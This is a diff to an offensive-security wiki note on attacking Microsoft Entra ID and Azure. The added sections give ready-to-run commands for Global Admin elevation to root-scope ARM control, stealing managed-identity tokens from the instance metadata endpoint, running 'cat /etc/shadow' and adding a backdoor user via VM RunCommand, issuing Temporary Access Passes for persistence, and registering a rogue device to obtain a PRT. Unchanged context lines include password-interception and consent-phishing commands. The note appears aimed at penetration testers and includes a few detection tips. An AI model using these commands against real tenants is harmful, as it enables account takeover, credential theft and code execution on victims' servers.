@@ -29,7 +29,8 @@ Microsoft Entra ID (formerly Azure AD) is Microsoft's cloud identity platform �
 | [[Tools/Credential Dumping/mimikatz\|mimikatz]] | Extract PRT + session key from LSASS (`sekurlsa::cloudap`), on-prem DCSync |
 | [[Tools/Credential Dumping/secretsdump\|secretsdump.py]] | DCSync using stolen MSOL / Azure AD Connect credentials |
 | [[Tools/Cloud/Evilginx2\|Evilginx2]] | AiTM phishing proxy — captures session cookies/tokens, defeats MFA |
-| Azure CLI (`az`) | Authenticate as a service principal, enumerate/abuse RBAC role assignments |
+| [[Tools/Cloud/azure-cli\|az]] | Azure CLI — authenticate as a service principal, `elevateAccess`, enumerate/abuse ARM RBAC role assignments |
+| [[Tools/Cloud/MicroBurst\|MicroBurst]] | Azure resource-plane abuse — managed-identity/IMDS token theft, VM RunCommand, storage-key extraction |
 
 ---
 
@@ -242,6 +243,8 @@ dsregcmd /status
 # Look for: AzureAdJoined: YES, WorkplaceJoined, SSO State
 ```
 
+> [!tip] **You don't need an existing device to get a PRT.** With only a victim's credentials (password or a stolen refresh token), you can **register your own rogue device** into Entra and have a PRT issued *to it* — turning stolen creds into a device-bound, MFA-satisfying token you fully control. [[Tools/Cloud/ROADtools|ROADtools]]' `roadtx` chains this (register device → request PRT → enrich a session cookie) end to end; see that note for the current subcommand flow. This is often cleaner than scraping a PRT out of LSASS, since it never touches a real endpoint.
+
 ### Seamless SSO — NTLM Hash Extraction
 
 Seamless SSO creates a computer account `AZUREADSSOACC$` in on-prem AD. Its Kerberos key can be used to forge Kerberos service tickets for Azure AD authentication.
@@ -409,6 +412,64 @@ Install-AADIntPTASpy    # intercepts password validation calls, logs all auth at
 Set-AADIntPTABypass -Enable   # makes the agent accept any password for any user
 ```
 
+### Escalating to the Azure Resource Plane
+
+Everything above operates on the **identity plane** (Entra ID / Graph). Azure's **resource plane** (subscriptions, VMs, storage — the ARM API at `management.azure.com`) is secured *independently*: an Entra directory role grants **no** ARM access by default, and an ARM role grants no directory access. Crossing that boundary is its own escalation, and it's the step that turns "tenant admin" into "code execution on their servers".
+
+**Global Admin → root-scope ARM control.** A Global Administrator can unilaterally assign themselves **User Access Administrator at root scope (`/`)** — one documented API call, no approval, applies to every subscription and management group in the tenant. From there, grant yourself Owner/Contributor on anything.
+
+```bash
+# One call. Grants User Access Administrator at "/" — verified against the ARM REST reference.
+az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
+# REST equivalent:
+#   POST https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01
+
+# Now assignable across the whole tenant
+az role assignment create --assignee <your-oid> --role Owner --scope /subscriptions/<sub-id>
+```
+
+> [!warning] **This is extremely loud and self-cleaning is expected.** The call writes to *both* the Entra directory audit log ("User has elevated their access to User Access Administrator...") and the Azure Activity log (`Microsoft.Authorization/elevateAccess/action`). It cannot be done quietly. Toggle it back off (`az role assignment delete ... --role "User Access Administrator" --scope "/"`) when finished, and flag it in the report as the single highest-impact cross-plane action a compromised GA can take.
+
+**Managed Identity / IMDS token theft.** An Azure VM (or App Service / Function / Automation runbook) with a managed identity holds ARM credentials retrievable from the **Instance Metadata Service** — a non-routable link-local endpoint reachable only from *inside* the resource. Any code execution on the VM (a webshell, an SSRF that reaches `169.254.169.254`, a command-injection) can mint that identity's tokens, and managed identities are routinely over-permissioned.
+
+```bash
+# From inside the VM (or via SSRF that reaches IMDS). The Metadata:true header is mandatory —
+# it's what stops a browser/CSRF from reading it, and confirmed required by the IMDS docs.
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+# → ARM access token. Swap resource= to https://graph.microsoft.com/ or https://vault.azure.net for others.
+
+az login --identity          # az's built-in path to the same token
+az role assignment list --assignee <mi-oid> --all -o table   # see what it can reach
+```
+
+**RunCommand — ARM control → SYSTEM on the VM.** If your ARM access includes `Microsoft.Compute/virtualMachines/runCommand/action` (Contributor and several built-ins have it), you can execute code as **SYSTEM/root** on any VM through the management plane — no RDP, no SSH, no network path to the guest required. This is the resource-plane analogue of PsExec.
+
+```bash
+az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript \
+  --scripts "id; cat /etc/shadow"                          # Linux VM, as root
+az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript \
+  --scripts "whoami; net user hacker P@ssw0rd! /add"       # Windows VM, as SYSTEM
+```
+
+Use [[Tools/Cloud/MicroBurst\|MicroBurst]] to automate the IMDS/RunCommand/storage-key sweep across a subscription once you hold an ARM token.
+
+> [!note] **The full cross-plane chain:** phish/steal a GA → `elevateAccess` → assign yourself Contributor → `run-command` for SYSTEM on the DC or Azure AD Connect VM → on-prem DCSync (see [[#Azure AD Connect Attacks]] above). Identity plane and resource plane compromise each other in a loop once you can cross the boundary either way.
+
+### Temporary Access Pass (TAP) Persistence
+
+A **Temporary Access Pass** is a time-limited passcode credential Entra issues for onboarding/recovery; critically, it **satisfies MFA on its own**. An attacker holding Authentication Administrator (or Privileged Authentication Administrator, needed to target other admins) can issue a TAP for a victim and log in as them with a single string — no password, no second factor, no registered device.
+
+```bash
+# Issue a TAP for the target (Graph). Requires UserAuthenticationMethod.ReadWrite.All + the role above.
+curl -s -X POST "https://graph.microsoft.com/v1.0/users/<target-oid>/authentication/temporaryAccessPassMethods" \
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"lifetimeInMinutes":480,"isUsableOnce":false}'
+# Returns temporaryAccessPass — a passcode usable as full auth for the window set
+```
+
+> [!note] Quieter and longer-lived than MFA-fatigue, and it survives a password reset for its lifetime. A `isUsableOnce:false` TAP with a long `lifetimeInMinutes` (max is tenant-policy-bound, default up to 8h/480m) is a clean persistence window. It does appear in the target's registered auth methods and in audit logs — enumerate `.../authentication/methods` on privileged users during a review to catch one.
+
 ---
 
 ## Dangerous Settings
@@ -428,6 +489,10 @@ Set-AADIntPTABypass -Enable   # makes the agent accept any password for any user
 | Dynamic group membership rule broader than intended | Silent privilege grant via attribute manipulation |
 | Device compliance not required by Conditional Access | Token from an unmanaged device is sufficient |
 | PTA agent running on a compromised host | Intercept/bypass all password auth tenant-wide |
+| Global Admin able to toggle "Access management for Azure resources" | `elevateAccess` → User Access Administrator at root scope → Owner on every subscription |
+| Managed identity with broad ARM roles on a reachable VM/App Service | IMDS token theft → ARM control (Contributor+ → RunCommand → SYSTEM) |
+| VM RunCommand permission (`.../runCommand/action`) | Code execution as SYSTEM/root via ARM, no network path to the guest |
+| Authentication Administrator held by a non-tier-0 account | Issue a TAP for any lower-tier user → passwordless, MFA-satisfying login |
 
 ---
 
@@ -447,15 +512,20 @@ Set-AADIntPTABypass -Enable   # makes the agent accept any password for any user
 | Graph API — list all users | `curl -s "https://graph.microsoft.com/v1.0/users?\$top=999" -H "Authorization: Bearer $TOKEN"` |
 | Consent-phishing app | `Invoke-InjectOAuthApp -Tokens $tokens -AppName "IT Support" -Scope "Mail.Read,offline_access"` |
 | Extract Azure AD Connect creds | `Get-AADIntSyncCredentials` |
+| GA → root-scope ARM | `az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"` |
+| Steal a VM's managed-identity token | `curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"` |
+| Code exec as SYSTEM via ARM | `az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript --scripts "whoami"` |
+| Issue a TAP for persistence | `POST /users/<oid>/authentication/temporaryAccessPassMethods` `{"lifetimeInMinutes":480,"isUsableOnce":false}` |
 
 ---
 
-> [!note] **See also** — [[Techniques/OAuth-OIDC-SAML|OAuth / OIDC / SAML Attacks]] — the protocol-level view of device code phishing, FOCI refresh-token pivoting, PRT escalation, and Silver SAML that this note applies to the M365/Entra environment.
+> [!note] **See also** — [[Techniques/OAuth-OIDC-SAML|OAuth / OIDC / SAML Attacks]] — the protocol-level view of device code phishing, FOCI refresh-token pivoting, PRT escalation, and Silver SAML that this note applies to the M365/Entra environment. Legacy mail protocols that bypass Conditional Access / MFA: [[Services/Email/IMAP|IMAP]], [[Services/Email/POP3|POP3]], [[Services/Email/SMTP|SMTP]].
+> SaaS sibling: [[Services/Cloud & Data/Salesforce|Salesforce]] — the same leaked-token / connected-app / guest-access pattern in a Salesforce org.
 > Protocol reference — how SAML works and the signing-cert trust model Golden/Silver SAML forge against: [[Standards & Protocols/SAML|SAML]].
 > Protocol reference — OAuth 2.0 / OIDC, the token model behind device-code phishing, FOCI, and PRT abuse: [[Standards & Protocols/OAuth-OIDC|OAuth 2.0 & OIDC]].
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
